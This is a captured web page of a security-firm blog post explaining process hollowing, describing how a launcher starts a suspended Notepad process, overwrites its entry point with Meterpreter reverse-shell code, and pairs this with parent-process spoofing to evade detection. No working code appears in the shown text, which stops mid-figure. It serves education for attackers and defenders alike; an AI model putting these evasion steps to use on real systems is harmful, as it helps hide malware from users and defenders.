# https://trustedsec.com/blog/the-nightmare-of-proc-hollows-exe

<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US">
  <body class="mx-auto lang-en section-blog type-blog antialiased overscroll-none"><div class="cky-hide cky-overlay"></div><div class="cky-btn-revisit-wrapper cky-revisit-hide cky-revisit-bottom-left" data-cky-tag="revisit-consent" data-tooltip="Consent Preferences" style="background-color: #000000;"><button aria-label="Consent Preferences" class="cky-btn-revisit"><img alt="Revisit consent button" src="https://cdn-cookieyes.com/assets/images/revisit.svg"></button></div><div class="cky-consent-container cky-box-bottom-left" aria-label="We value your privacy" role="region" tabindex="0"><div class="cky-consent-bar" data-cky-tag="notice" style="border-color: #EDF1F4; background-color: #EDF1F4;"><div class="cky-notice"><p class="cky-title" aria-level="1" data-cky-tag="title" role="heading" style="color: #212121;">We value your privacy</p><div class="cky-notice-group"><div class="cky-notice-des" data-cky-tag="description" style="color: #212121;"><p>We use cookies to enhance your browsing experience, serve personalised ads or content, and analyse our traffic. By clicking "Accept All", you consent to our use of cookies.</p></div><div class="cky-notice-btn-wrapper" data-cky-tag="notice-buttons"><button class="cky-btn cky-btn-customize" aria-label="Customise" data-cky-tag="settings-button" style="color: #000000; border-color: #000000; background-color: #EDF1F4;">Customise</button> <button class="cky-btn cky-btn-reject" aria-label="Reject All" data-cky-tag="reject-button" style="color: #FFFFFF; border-color: #000000; background-color: #000000;">Reject All</button> <button class="cky-btn cky-btn-accept" aria-label="Accept All" data-cky-tag="accept-button" style="color: #FFFFFF; border-color: #000000; background-color: #000000;">Accept All</button> </div></div></div></div></div><div class="cky-modal" tabindex="0"><div class="cky-preference-center" data-cky-tag="detail" aria-label="Customise Consent Preferences" aria-modal="true" role="dialog" style="color: #212121; border-color: #EDF1F4; background-color: #EDF1F4;"><div class="cky-preference-header"><span class="cky-preference-title" aria-level="1" data-cky-tag="detail-title" role="heading" style="color: #212121;">Customise Consent Preferences</span> <button aria-label="Close" class="cky-btn-close" data-cky-tag="detail-close"><img alt="Close" src="https://cdn-cookieyes.com/assets/images/close.svg" width="10" height="10"></button></div><div class="cky-preference-body-wrapper"><div class="cky-preference-content-wrapper" data-cky-tag="detail-description" style="color: #212121;"><p>We use cookies to help you navigate efficiently and perform certain functions. You will find detailed information about all cookies under each consent category below.</p><p>The cookies that are categorised as "Necessary" are stored on your browser as they are essential for enabling the basic functionalities of the site. ...&nbsp;<button class="cky-show-desc-btn" data-cky-tag="show-desc-button" aria-label="Show more">Show more</button></p></div><div class="cky-horizontal-separator"></div><div class="cky-accordion-wrapper" data-cky-tag="detail-categories"><div class="cky-accordion" id="ckyDetailCategorynecessary"><div class="cky-accordion-item"><div class="cky-accordion-chevron"><i class="cky-chevron-right"></i></div><div class="cky-accordion-header-wrapper"><div class="cky-accordion-header"><button class="cky-accordion-btn" aria-expanded="false" aria-controls="ckyDetailCategorynecessaryBody" aria-label="Necessary" data-cky-tag="detail-category-title" style="color: #212121;">Necessary</button><span class="cky-always-active" data-cky-tag="always-active">Always Active</span></div><div class="cky-accordion-header-des" data-cky-tag="detail-category-description" style="color: #212121;"><p>Necessary cookies are required to enable the basic features of this site, such as providing secure log-in or adjusting your consent preferences. These cookies do not store any personally identifiable data.</p></div></div></div><div class="cky-accordion-body" id="ckyDetailCategorynecessaryBody"><div class="cky-audit-table" data-cky-tag="audit-table" style="color: #212121; border-color: #EBEBEB; background-color: #F4F4F4;"><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>__cf_bm</div></li><li><div>Duration</div><div>1 hour</div></li><li><div>Description</div><div>This cookie, set by Cloudflare, is used to support Cloudflare Bot Management. </div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>__hssrc</div></li><li><div>Duration</div><div>session</div></li><li><div>Description</div><div>This cookie is set by Hubspot whenever it changes the session cookie. The __hssrc cookie set to 1 indicates that the user has restarted the browser, and if the cookie does not exist, it is assumed to be a new session.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>__hssc</div></li><li><div>Duration</div><div>1 hour</div></li><li><div>Description</div><div>HubSpot sets this cookie to keep track of sessions and to determine if HubSpot should increment the session number and timestamps in the __hstc cookie.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>_cfuvid</div></li><li><div>Duration</div><div>session</div></li><li><div>Description</div><div>Calendly sets this cookie to track users across sessions to optimize user experience by maintaining session consistency and providing personalized services</div></li></ul></div></div></div><div class="cky-accordion" id="ckyDetailCategoryfunctional"><div class="cky-accordion-item"><div class="cky-accordion-chevron"><i class="cky-chevron-right"></i></div><div class="cky-accordion-header-wrapper"><div class="cky-accordion-header"><button class="cky-accordion-btn" aria-expanded="false" aria-controls="ckyDetailCategoryfunctionalBody" aria-label="Functional" data-cky-tag="detail-category-title" style="color: #212121;">Functional</button><div class="cky-switch" data-cky-tag="detail-category-toggle"><input type="checkbox" id="ckySwitchfunctional" aria-label="Enable Functional" autocomplete="off" style="background-color: rgb(237, 241, 244);"></div></div><div class="cky-accordion-header-des" data-cky-tag="detail-category-description" style="color: #212121;"><p>Functional cookies help perform certain functionalities like sharing the content of the website on social media platforms, collecting feedback, and other third-party features.</p></div></div></div><div class="cky-accordion-body" id="ckyDetailCategoryfunctionalBody"><div class="cky-audit-table" data-cky-tag="audit-table" style="color: #212121; border-color: #EBEBEB; background-color: #F4F4F4;"><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>lidc</div></li><li><div>Duration</div><div>1 day</div></li><li><div>Description</div><div>LinkedIn sets the lidc cookie to facilitate data center selection.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>li_gc</div></li><li><div>Duration</div><div>6 months</div></li><li><div>Description</div><div>Linkedin set this cookie for storing visitor's consent regarding using cookies for non-essential purposes.</div></li></ul></div></div></div><div class="cky-accordion" id="ckyDetailCategoryanalytics"><div class="cky-accordion-item"><div class="cky-accordion-chevron"><i class="cky-chevron-right"></i></div><div class="cky-accordion-header-wrapper"><div class="cky-accordion-header"><button class="cky-accordion-btn" aria-expanded="false" aria-controls="ckyDetailCategoryanalyticsBody" aria-label="Analytics" data-cky-tag="detail-category-title" style="color: #212121;">Analytics</button><div class="cky-switch" data-cky-tag="detail-category-toggle"><input type="checkbox" id="ckySwitchanalytics" aria-label="Enable Analytics" autocomplete="off" style="background-color: rgb(237, 241, 244);"></div></div><div class="cky-accordion-header-des" data-cky-tag="detail-category-description" style="color: #212121;"><p>Analytical cookies are used to understand how visitors interact with the website. These cookies help provide information on metrics such as the number of visitors, bounce rate, traffic source, etc.</p></div></div></div><div class="cky-accordion-body" id="ckyDetailCategoryanalyticsBody"><div class="cky-audit-table" data-cky-tag="audit-table" style="color: #212121; border-color: #EBEBEB; background-color: #F4F4F4;"><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>_gcl_au</div></li><li><div>Duration</div><div>3 months</div></li><li><div>Description</div><div>Google Tag Manager sets the cookie to experiment advertisement efficiency of websites using their services.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>_ga_*</div></li><li><div>Duration</div><div>1 year 1 month 4 days</div></li><li><div>Description</div><div>Google Analytics sets this cookie to store and count page views.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>_ga</div></li><li><div>Duration</div><div>1 year 1 month 4 days</div></li><li><div>Description</div><div>Google Analytics sets this cookie to calculate visitor, session and campaign data and track site usage for the site's analytics report. The cookie stores information anonymously and assigns a randomly generated number to recognise unique visitors.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>__hstc</div></li><li><div>Duration</div><div>6 months</div></li><li><div>Description</div><div>Hubspot set this main cookie for tracking visitors. It contains the domain, initial timestamp (first visit), last timestamp (last visit), current timestamp (this visit), and session number (increments for each subsequent session).</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>hubspotutk</div></li><li><div>Duration</div><div>6 months</div></li><li><div>Description</div><div>HubSpot sets this cookie to keep track of the visitors to the website. This cookie is passed to HubSpot on form submission and used when deduplicating contacts.</div></li></ul></div></div></div><div class="cky-accordion" id="ckyDetailCategoryperformance"><div class="cky-accordion-item"><div class="cky-accordion-chevron"><i class="cky-chevron-right"></i></div><div class="cky-accordion-header-wrapper"><div class="cky-accordion-header"><button class="cky-accordion-btn" aria-expanded="false" aria-controls="ckyDetailCategoryperformanceBody" aria-label="Performance" data-cky-tag="detail-category-title" style="color: #212121;">Performance</button><div class="cky-switch" data-cky-tag="detail-category-toggle"><input type="checkbox" id="ckySwitchperformance" aria-label="Enable Performance" autocomplete="off" style="background-color: rgb(237, 241, 244);"></div></div><div class="cky-accordion-header-des" data-cky-tag="detail-category-description" style="color: #212121;"><p>Performance cookies are used to understand and analyse the key performance indexes of the website which helps in delivering a better user experience for the visitors.</p></div></div></div><div class="cky-accordion-body" id="ckyDetailCategoryperformanceBody"><div class="cky-audit-table" data-cky-tag="audit-table" style="color: #212121; border-color: #EBEBEB; background-color: #F4F4F4;"><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>session_id</div></li><li><div>Duration</div><div>1 year</div></li><li><div>Description</div><div>This cookie is used to get or set the session id for the current session.</div></li></ul></div></div></div><div class="cky-accordion" id="ckyDetailCategoryadvertisement"><div class="cky-accordion-item"><div class="cky-accordion-chevron"><i class="cky-chevron-right"></i></div><div class="cky-accordion-header-wrapper"><div class="cky-accordion-header"><button class="cky-accordion-btn" aria-expanded="false" aria-controls="ckyDetailCategoryadvertisementBody" aria-label="Advertisement" data-cky-tag="detail-category-title" style="color: #212121;">Advertisement</button><div class="cky-switch" data-cky-tag="detail-category-toggle"><input type="checkbox" id="ckySwitchadvertisement" aria-label="Enable Advertisement" autocomplete="off" style="background-color: rgb(237, 241, 244);"></div></div><div class="cky-accordion-header-des" data-cky-tag="detail-category-description" style="color: #212121;"><p>Advertisement cookies are used to provide visitors with customised advertisements based on the pages you visited previously and to analyse the effectiveness of the ad campaigns.</p></div></div></div><div class="cky-accordion-body" id="ckyDetailCategoryadvertisementBody"><div class="cky-audit-table" data-cky-tag="audit-table" style="color: #212121; border-color: #EBEBEB; background-color: #F4F4F4;"><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>sa-user-id</div></li><li><div>Duration</div><div>1 year</div></li><li><div>Description</div><div>StackAdapt sets this cookie as a third party advertising cookie to record information about a user's website activity, such as the pages visited and the locations viewed, to enable us to provide users with interest-based content and personalised advertisements on external websites.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>sa-user-id-v2</div></li><li><div>Duration</div><div>1 year</div></li><li><div>Description</div><div>StackAdapt sets this cookie as a third party advertising cookie to record information about a user's website activity, such as the pages visited and the locations viewed, to enable us to provide users with interest-based content and personalised advertisements on external websites.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>bcookie</div></li><li><div>Duration</div><div>1 year</div></li><li><div>Description</div><div>LinkedIn sets this cookie from LinkedIn share buttons and ad tags to recognize browser IDs.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>IDE</div></li><li><div>Duration</div><div>1 year 24 days</div></li><li><div>Description</div><div>Google DoubleClick IDE cookies store information about how the user uses the website to present them with relevant ads according to the user profile.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>test_cookie</div></li><li><div>Duration</div><div>15 minutes</div></li><li><div>Description</div><div>doubleclick.net sets this cookie to determine if the user's browser supports cookies.</div></li></ul></div></div></div><div class="cky-accordion" id="ckyDetailCategoryother"><div class="cky-accordion-item"><div class="cky-accordion-chevron"><i class="cky-chevron-right"></i></div><div class="cky-accordion-header-wrapper"><div class="cky-accordion-header"><button class="cky-accordion-btn" aria-expanded="false" aria-controls="ckyDetailCategoryotherBody" aria-label="Uncategorised" data-cky-tag="detail-category-title" style="color: #212121;">Uncategorised</button><div class="cky-switch" data-cky-tag="detail-category-toggle"><input type="checkbox" id="ckySwitchother" aria-label="Enable Uncategorised" autocomplete="off" style="background-color: rgb(237, 241, 244);"></div></div><div class="cky-accordion-header-des" data-cky-tag="detail-category-description" style="color: #212121;"><p>Other uncategorised cookies are those that are being analysed and have not been classified into a category as yet.</p></div></div></div><div class="cky-accordion-body" id="ckyDetailCategoryotherBody"><div class="cky-audit-table" data-cky-tag="audit-table" style="color: #212121; border-color: #EBEBEB; background-color: #F4F4F4;"><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>sa-user-id-v3</div></li><li><div>Duration</div><div>1 year</div></li><li><div>Description</div><div>Description is currently not available.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>calltrk_nearest_tld</div></li><li><div>Duration</div><div>1 year 1 month 4 days</div></li><li><div>Description</div><div>Description is currently not available.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>calltrk_referrer</div></li><li><div>Duration</div><div>6 months</div></li><li><div>Description</div><div>This is a functionality cookie set by the CallRail. This cookie is used to store the referring URL. It helps to accurately attribute the visitor source when displaying a tracking phone number.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>calltrk_landing</div></li><li><div>Duration</div><div>6 months</div></li><li><div>Description</div><div>This is a functionality cookie set by the CallRail. This cookie is used to store the landing page URL. It helps to accurately attribute the visitor source when displaying a tracking phone number.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>frontend_lang</div></li><li><div>Duration</div><div>1 year</div></li><li><div>Description</div><div>No description available.</div></li></ul><ul class="cky-cookie-des-table"><li><div>Cookie</div><div>libsyn-paywall-s</div></li><li><div>Duration</div><div>1 day</div></li><li><div>Description</div><div>Description is currently not available.</div></li></ul></div></div></div></div></div><div class="cky-footer-wrapper"><span class="cky-footer-shadow" style="background: linear-gradient(180deg, rgba(255, 255, 255, 0) 0%, #EDF1F4 100%);"></span><div class="cky-prefrence-btn-wrapper" data-cky-tag="detail-buttons"><button aria-label="Reject All" class="cky-btn cky-btn-reject" data-cky-tag="detail-reject-button" style="color: #FFFFFF; border-color: #000000; background-color: #000000;">Reject All</button> <button aria-label="Save My Preferences" class="cky-btn cky-btn-preferences" data-cky-tag="detail-save-button" style="color: #FFFFFF; border-color: #000000; background-color: #000000;">Save My Preferences</button> <button aria-label="Accept All" class="cky-btn cky-btn-accept" data-cky-tag="detail-accept-button" style="color: #FFFFFF; border-color: #000000; background-color: #000000;">Accept All</button></div><div data-cky-tag="detail-powered-by" style="padding: 8px 24px; font-size: 12px; font-weight: 400; line-height: 20px; text-align: right; border-radius: 0 0 6px 6px; direction: ltr; display: flex; justify-content: flex-end; align-items: center; color: #293C5B; background-color: #EDEDED;">Powered by <a href="https://www.cookieyes.com/product/cookie-consent/?ref=cypbcyb&amp;utm_source=cookie-banner&amp;utm_medium=powered-by-cookieyes" rel="noopener" style="margin-left:5px;line-height:0" target="_blank"><img alt="Cookieyes logo" src="https://cdn-cookieyes.com/assets/images/poweredbtcky.svg" style="width:78px;height:13px;margin:0" width="78" height="13"></a></div></div></div></div>


	

    

<!-- Global Header -->

<!-- End Global Header -->
		<main id="main" class="main overflow-x-hidden">

			

   



<section class="c-page-header relative bg-code text-white">

    <div class="px-p24 mq768:px-p48 mq1024:px-p56 c-header-wrap v-blog-header">
    <div class="max-w-p1440 mx-auto">
      <div class="flex flex-col mq768:flex-row">
        <div class="flex relative z-20 items-center mq768:w-1/2 order-1 py-p48 mq1024:py-p56 mq768:pr-p64 mq1024:pr-p56">

          <div class="w-full">

            

  
<ul class="mb-p64 mq1024:mb-p80 flex flex-wrap text-white">
                <li class="after:content-['/'] last:after:hidden after:mx-p8"><a class="text-sm hover:underline focus:underline" href="https://trustedsec.com/blog">Blog</a></li>
            <li class="after:content-['/'] last:after:hidden after:mx-p8"><a class="text-sm hover:underline focus:underline" href="https://trustedsec.com/blog/the-nightmare-of-proc-hollows-exe">The Nightmare of Proc Hollow’s Exe</a></li>
     </ul>
                        <div class="mb-p32">

                              <div class="mb-p16">
                  <span class="font-mono text-sm">June 13, 2023</span>
                </div>
              
                                                                <h1 class="text-h1 mq1280:text-title-xl">The Nightmare of Proc Hollow’s&nbsp;Exe</h1>
                              
                                        </div>

                          <div class="mb-p16">
                <span class="text-h3 inline-block">
                  Written by
                                                            Leo Bastidas
                                                      </span>
              </div>
            


            
            
            
            <div class="mt-p64">
                          </div>
          </div>
        </div>

        <div class="mq768:flex overflow-hidden items-center mq768:justify-end mq768:w-paired-img max-w-p1080 -mx-p24 mq768:mx-none order-2 mq768:absolute inset-y-0 left-paired-img-plus fx" x-data="" x-fx.left.1200="2rem" style="transform: translate3d(-2rem, 0px, 0px); transition-duration: 1.2s;">
          <div class="relative mq768:static mq768:w-full h-full pt-full -mx-p24 mq768:mx-none">
                          <picture class=" w-full"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/ProcsHollowExe_WebHero.jpg?w=600&amp;h=600&amp;q=90&amp;fm=webp&amp;fit=crop&amp;dm=1767068920&amp;s=455385fb036a0925f6d2241636680369, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/ProcsHollowExe_WebHero.jpg?w=900&amp;h=900&amp;q=90&amp;fm=webp&amp;fit=crop&amp;dm=1767068920&amp;s=4241c826a7c2f18e55da152139f9519d 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/ProcsHollowExe_WebHero.jpg?w=600&amp;h=600&amp;q=90&amp;auto=format&amp;fit=crop&amp;dm=1767068920&amp;s=1b94c6d0c25e4f6c2b618382b7926967, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/ProcsHollowExe_WebHero.jpg?w=900&amp;h=900&amp;q=90&amp;auto=format&amp;fit=crop&amp;dm=1767068920&amp;s=1daf96cb361221e150aa8ddb8d89c5ad 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/ProcsHollowExe_WebHero.jpg?w=320&amp;h=320&amp;q=90&amp;fm=webp&amp;fit=crop&amp;dm=1767068920&amp;s=f4f551e665e399713c0cd7d6d0c92cbc, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/ProcsHollowExe_WebHero.jpg?w=480&amp;h=480&amp;q=90&amp;fm=webp&amp;fit=crop&amp;dm=1767068920&amp;s=b234e49a96ce90b8ef9d4ac3471c0524 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/ProcsHollowExe_WebHero.jpg?w=320&amp;h=320&amp;q=90&amp;auto=format&amp;fit=crop&amp;dm=1767068920&amp;s=36715e2d557500d2bd37340316b1a655, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/ProcsHollowExe_WebHero.jpg?w=480&amp;h=480&amp;q=90&amp;auto=format&amp;fit=crop&amp;dm=1767068920&amp;s=b51c0f9c02871a836fd972010630f16f 1.5x"><img class="c-img opacity-0 transition-all duration-300 absolute inset-0 object-cover w-full h-full object-center" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/ProcsHollowExe_WebHero.jpg?w=320&amp;h=320&amp;q=90&amp;auto=format&amp;fit=crop&amp;dm=1767068920&amp;s=36715e2d557500d2bd37340316b1a655" loading="eager" x-data="image({mq1024:{width:600,height:600},DEFAULT:{width:320,height:320}})" :width="getSize()" :height="getSize('height')" alt="" width="600" height="600" style="opacity: 1;"></picture>                      </div>
        </div>
      </div>
    </div>
  </div>

</section>


      
			
						<div class="relative"><section id="migratedContent-0" class="c-module relative bg-white text-black py-p64 mq768:py-p96" data-module-num="1" style="z-index: 0;"><div class="px-p24 mq768:px-p48 mq1024:px-p56"><div class="max-w-p1440 mx-auto"><div class="flex flex-col mq1024:flex-row" x-data="{ mobile: ! $breakpoint('mq1024') }" @resize.window="mobile = ! $breakpoint('mq1024')"><div class="mq1024:w-p320 mq1024:pr-p64 grow-0 shrink-0 mq1024:order-1"><div><div class="w-full"><p id="share-label" class="text-xs font-mono mb-p16">Share</p><ul id="share-icons" class="flex items-center" aria-describedby="share-label"><li class="ml-p12"><a href="https://trustedsec.com/blog/the-nightmare-of-proc-hollows-exe" target="_blank" title="Share URL" data-target="https://trustedsec.com/blog/the-nightmare-of-proc-hollows-exe"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-share"></use></svg></span><span class="sr-only">Share URL</span></a></li><li class="ml-p12"><a href="mailto:?subject=Check%20out%20this%20article%20from%20TrustedSec%21&amp;body=The%20Nightmare%20of%20Proc%20Hollow%E2%80%99s%20Exe%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fthe-nightmare-of-proc-hollows-exe" target="_blank" title="Share via Email" data-target="https://trustedsec.com/blog/the-nightmare-of-proc-hollows-exe"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-email"></use></svg></span><span class="sr-only">Share via Email</span></a></li><li class="ml-p12"><a href="http://www.facebook.com/sharer.php?u=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fthe-nightmare-of-proc-hollows-exe" target="_blank" title="Share on Facebook" data-target="https://trustedsec.com/blog/the-nightmare-of-proc-hollows-exe"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-facebook"></use></svg></span><span class="sr-only">Share on Facebook</span></a></li><li class="ml-p12"><a href="http://twitter.com/share?text=The%20Nightmare%20of%20Proc%20Hollow%E2%80%99s%20Exe%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fthe-nightmare-of-proc-hollows-exe" title="Share on X" rel="nofollow" data-target="https://trustedsec.com/blog/the-nightmare-of-proc-hollows-exe"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-twitter"></use></svg></span><span class="sr-only">Share on X</span></a></li><li class="ml-p12"><a href="https://www.linkedin.com/shareArticle?url=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fthe-nightmare-of-proc-hollows-exe&amp;mini=true" target="_blank" title="Share on LinkedIn" data-target="https://trustedsec.com/blog/the-nightmare-of-proc-hollows-exe"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-linkedin"></use></svg></span><span class="sr-only">Share on LinkedIn</span></a></li></ul></div></div><div><div class="w-full"><p id="share-label" class="text-xs font-mono mb-p16">Share</p><ul id="share-icons" class="flex items-center" aria-describedby="share-label"><li class="ml-p12"><a href="https://trustedsec.com/blog/the-nightmare-of-proc-hollows-exe" target="_blank" title="Share URL" data-target="https://trustedsec.com/blog/the-nightmare-of-proc-hollows-exe"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-share"></use></svg></span><span class="sr-only">Share URL</span></a></li><li class="ml-p12"><a href="mailto:?subject=Check%20out%20this%20article%20from%20TrustedSec%21&amp;body=The%20Nightmare%20of%20Proc%20Hollow%E2%80%99s%20Exe%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fthe-nightmare-of-proc-hollows-exe" target="_blank" title="Share via Email" data-target="https://trustedsec.com/blog/the-nightmare-of-proc-hollows-exe"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-email"></use></svg></span><span class="sr-only">Share via Email</span></a></li><li class="ml-p12"><a href="http://www.facebook.com/sharer.php?u=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fthe-nightmare-of-proc-hollows-exe" target="_blank" title="Share on Facebook" data-target="https://trustedsec.com/blog/the-nightmare-of-proc-hollows-exe"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-facebook"></use></svg></span><span class="sr-only">Share on Facebook</span></a></li><li class="ml-p12"><a href="http://twitter.com/share?text=The%20Nightmare%20of%20Proc%20Hollow%E2%80%99s%20Exe%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fthe-nightmare-of-proc-hollows-exe" title="Share on X" rel="nofollow" data-target="https://trustedsec.com/blog/the-nightmare-of-proc-hollows-exe"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-twitter"></use></svg></span><span class="sr-only">Share on X</span></a></li><li class="ml-p12"><a href="https://www.linkedin.com/shareArticle?url=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fthe-nightmare-of-proc-hollows-exe&amp;mini=true" target="_blank" title="Share on LinkedIn" data-target="https://trustedsec.com/blog/the-nightmare-of-proc-hollows-exe"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-linkedin"></use></svg></span><span class="sr-only">Share on LinkedIn</span></a></li></ul></div></div></div><div class="w-full mq1024:w-content-well mq1024:order-2 flex-1"><div class="c-content"><p>In the last blog on Parent Process ID (PPID) Spoofing, we discussed how to hide the malicious process by giving it a legit parent. In this blog, we are going to discuss yet another method of hiding malicious code, using Process Hollowing. At a high level, this is where malicious code launches a new process, then overwrites parts of it, and then allows the process to continue running. When a specific event is triggered, the malicious code is executed. Process Hollowing works well with PPID spoofing because of the need to start a new process. Spoofing the new program's parent ID is a good way to make our process look benign and add an extra layer of misdirection.</p><h2 class="wp-block-heading">1.1    &nbsp; What is Process Hollowing?</h2><p>Process Hollowing is a type of code injection. It is used by attackers to hide the malicious code in a process that appears to be benign and hides the original process that performed the injection. Process Hollowing starts a new program and injects malicious code into it. Because the new program was created by us, we have control over its memory. Unlike other code injection techniques where we could allocate new memory to store the malicious code, Process Hollowing attempts to overwrite the existing code. Depending on how the code is overwritten, it will most likely corrupt the original execution, causing the normal usage of the launched program to not execute.</p><figure class="wp-block-image size-large aligncenter"><img src="https://www.trustedsec.com/wp-content/uploads/2023/06/Leo_fig1.png" alt="" class="wp-image-29869"><figcaption class="wp-element-caption">Figure 1 - Process General Diagram 1</figcaption></figure><h2 class="wp-block-heading">1.2    &nbsp; How Does it Work?</h2><p>We will call the original process performing the injection a.exe. This doesn't have to be an executable—it could be shell code that executed during an RCE exploit—but for this discussion, it will be an exe. The victim executes a.exe; a.exe then creates a new Notepad process in a suspended state. The suspended state tells the system to load and resolve dependencies but not to call the entry point yet. Next, a.exe determines the location to inject the malicious code. In most cases, this will be at the entry point of the spawned process, but there is an alternative method of RunPE but that will not be discussed in this blog. Overwriting the entry point will guarantee that the malicious code will be called first, taking complete control of the program. After the entry point has been overwritten, a.exe will resume the process executing the malicious code.</p><figure class="wp-block-image size-full aligncenter"><img src="https://www.trustedsec.com/wp-content/uploads/2023/06/proc_hollowing_flow.gif" alt="" class="wp-image-29902"><figcaption class="wp-element-caption">Figure 2 - Process Hollowing Workflow </figcaption></figure><p>Figure 3 will aid in illustrating the similarities between a benign Notepad and a Notepad that has had malicious code injected. Figure 3 shows the properties of the benign Notepad process (PID 6780). The properties show the name and path of the executable the current Process ID (PID), the parent PID (PPID), when it was started, and the address of the Process Environment Block (PEB). Figure 4 is another way to show the parent and the process IDs.</p><figure class="wp-block-image size-full aligncenter"><img src="https://www.trustedsec.com/wp-content/uploads/2023/06/Leo_fig3.png" alt="" class="wp-image-29870"><figcaption class="wp-element-caption">Figure 3 - Benign Notepad Properties</figcaption></figure><figure class="wp-block-image size-full aligncenter"><img src="https://www.trustedsec.com/wp-content/uploads/2023/06/Leo_fig4.png" alt="" class="wp-image-29871"><figcaption class="wp-element-caption">Figure 4 - Process Hacker View of Benign Notepad</figcaption></figure><p>Figure 5 shows the properties of the notepad that has malicious code injected into it. Also note that a.exe utilizes the PPID discussed in the previous blog to spoof the PPID to make it look like explorer is the parent. There are few items that are different between Figure 3 and Figure 5.</p><table><thead><tr><th><strong>Item Name that Changed</strong></th><th><strong>Figure 3</strong></th><th><strong>Figure 5</strong></th></tr></thead><tbody><tr><td>Command Line</td><td>Full path to notepad.exe</td><td>Abbreviated to “Notepad”</td></tr><tr><td>Current Directory Path</td><td>Users home directory</td><td>Directory used to execute the process_hollowing.exe</td></tr><tr><td>PEB Address</td><td colspan="2">Due to Address Space Layout Randomization (ALSR) this value will change for every execution</td></tr></tbody></table><figure class="wp-block-image size-full aligncenter"><img src="https://www.trustedsec.com/wp-content/uploads/2023/06/Leo_fig5.png" alt="" class="wp-image-29872"><figcaption class="wp-element-caption">Figure 5 - Process Hollowed Notepad</figcaption></figure><figure class="wp-block-image size-full aligncenter"><img src="https://www.trustedsec.com/wp-content/uploads/2023/06/Leo_fig6.png" alt="" class="wp-image-29873"><figcaption class="wp-element-caption">Figure 6 - Process Hacker View of the Hollowed Notepad</figcaption></figure><p>The original Notepad's entry point is shown in Figure 7, and the modified entry point is shown in Figure 8 with the Meterpreter reverse shell code at the entry point. Figure 9 is a hex dump of the Meterpreter shell code from the source code. This is just verification that the code running at the entry point is the malicious code.</p><figure class="wp-block-image size-full aligncenter"><img src="https://www.trustedsec.com/wp-content/uploads/2023/06/Leo_fig7.png" alt="" class="wp-image-29874"><figcaption class="wp-element-caption">Figure 7 - Benign Notepad's Program Entry Point</figcaption></figure><figure class="wp-block-image size-full aligncenter"><img src="https://www.trustedsec.com/wp-content/uploads/2023/06/Leo_fig8.png" alt="" 